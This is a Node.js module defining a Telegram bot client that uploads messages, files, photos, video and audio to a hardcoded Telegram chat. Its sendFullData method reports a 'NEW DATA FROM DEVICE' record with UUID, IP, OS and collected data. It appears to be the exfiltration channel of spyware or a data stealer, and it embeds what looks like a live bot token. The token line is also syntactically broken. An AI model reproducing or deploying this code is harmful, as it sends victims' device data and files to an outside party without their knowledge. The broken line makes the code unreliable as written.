const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

class TelegramBot {
 constructor(token, chatId) {
 this.token = 7561698582:AAFhMEKlCgKx136YBZ-p_f4Glg-cpzsQsyQ;
 this.chatId = 6837315281;
 this.baseUrl = `https://api.telegram.org/bot${this.token}`;
 }

 async sendMessage(text, options = {}) {
 try {
 const response = await axios.post(`${this.baseUrl}/sendMessage`, {
 chat_id: this.chatId,
 text: text,
 parse_mode: 'HTML',
 disable_web_page_preview: true,
...options
 });
 return response.data;
 } catch (error) {
 console.error('Telegram sendMessage error:', error.message);
 return null;
 }
 }

 async sendDocument(filePath, caption = '') {
 try {
 const form = new FormData();
 form.append('chat_id', this.chatId);
 form.append('document', fs.createReadStream(filePath));
 form.append('caption', caption);

 const response = await axios.post(`${this.baseUrl}/sendDocument`, form, {
 headers: form.getHeaders(),
 maxContentLength: Infinity,
 maxBodyLength: Infinity
 });
 return response.data;
 } catch (error) {
 console.error('Telegram sendDocument error:', error.message);
 return null;
 }
 }

 async sendPhoto(filePath, caption = '') {
 try {
 const form = new FormData();
 form.append('chat_id', this.chatId);
 form.append('photo', fs.createReadStream(filePath));
 form.append('caption', caption);

 const response = await axios.post(`${this.baseUrl}/sendPhoto`, form, {
 headers: form.getHeaders()
 });
 return response.data;
 } catch (error) {
 console.error('Telegram sendPhoto error:', error.message);
 return null;
 }
 }

 async sendVideo(filePath, caption = '') {
 try {
 const form = new FormData();
 form.append('chat_id', this.chatId);
 form.append('video', fs.createReadStream(filePath));
 form.append('caption', caption);

 const response = await axios.post(`${this.baseUrl}/sendVideo`, form, {
 headers: form.getHeaders()
 });
 return response.data;
 } catch (error) {
 console.error('Telegram sendVideo error:', error.message);
 return null;
 }
 }

 async sendAudio(filePath, caption = '') {
 try {
 const form = new FormData();
 form.append('chat_id', this.chatId);
 form.append('audio', fs.createReadStream(filePath));
 form.append('caption', caption);

 const response = await axios.post(`${this.baseUrl}/sendAudio`, form, {
 headers: form.getHeaders()
 });
 return response.data;
 } catch (error) {
 console.error('Telegram sendAudio error:', error.message);
 return null;
 }
 }

 async sendFullData(deviceInfo, dataType, data) {
 let message = `<b>📡 NEW DATA FROM DEVICE</b>\n\n`;
 message += `<b>🆔 UUID:</b> <code>${deviceInfo.uuid}</code>\n`;
 message += `<b>🌐 IP:</b> <code>${deviceInfo.ip}</code>\n`;
 message += `<b>💻 OS:</b> <code>${deviceInfo.os}</code>\n`;
 message += `<b>📅 Time:</b> <code>${deviceInfo.timestamp}</code>\n`;
 message += `<b>🏷️ Type:</b> <code>${dataType}</code>\n\n`;
 message += `<b>📄 DATA:</b>\n<pre>${JSON.stringify(data, null, 2)}</pre>`;

 return this.sendMessage(message);
 }
}

module.exports = TelegramBot;
